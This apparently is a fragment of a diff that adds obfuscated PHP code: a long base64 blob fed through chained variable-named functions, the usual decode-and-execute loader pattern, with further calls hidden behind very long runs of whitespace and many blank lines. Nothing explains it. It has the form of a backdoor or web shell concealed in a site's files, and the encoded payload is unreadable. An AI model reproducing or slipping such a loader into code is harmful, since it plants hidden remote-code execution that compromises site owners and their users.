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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
